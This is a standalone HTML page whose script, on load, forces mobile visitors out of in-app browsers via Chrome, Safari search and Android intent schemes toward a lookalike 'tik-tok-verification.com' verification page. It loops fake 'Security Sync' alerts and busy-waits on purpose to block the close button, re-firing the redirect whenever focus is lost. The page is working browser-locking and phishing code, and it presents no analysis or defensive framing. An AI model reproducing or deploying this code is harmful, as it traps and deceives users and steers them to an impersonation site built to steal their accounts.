<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 10000; 
    const gap = 200; // THE ABSOLUTE MINIMUM DELAY

    function triggerSafariJump() {
        const isAndroid = /Android/i.test(navigator.userAgent);
        const urlNoProtocol = target.replace("https://", "");

        // iOS: Force Safari via multiple browser schemes
        if (!isAndroid) {
            window.location.href = "googlechrome://" + urlNoProtocol;
            window.location.replace("x-web-search://?" + encodeURIComponent(target));
        } else {
            // Android: Chrome Intent
            window.location.href = `intent://${urlNoProtocol}#Intent;scheme=https;action=android.intent.action.VIEW;package=com.android.chrome;end`;
        }
    }

    function rampage() {
        if (Date.now() > killTime) return;

        // 1. Prime the Safari Jump
        triggerSafariJump();

        // 2. THE LOCK
        alert("ATTEMPT #35\n\nSecurity Sync: Final Phase.\n\nTap OK to open Safari.");

        // 3. THE SATURATION STUTTER
        // This blocks the 'X' button from working for the first 120ms of the gap
        const start = Date.now();
        while (Date.now() - start < 120) {
            Math.atan2(Math.random(), Math.random());
        }

        // 4. THE 200ms WINDOW
        setTimeout(() => {
            if (document.hasFocus()) {
                rampage();
            }
        }, gap - 120);
    }

    window.onload = () => {
        rampage();
    };

    // If focus is lost, keep pushing the Safari jump
    window.onblur = () => { if (Date.now() < killTime) triggerSafariJump(); };
</script>

</body>
</html>
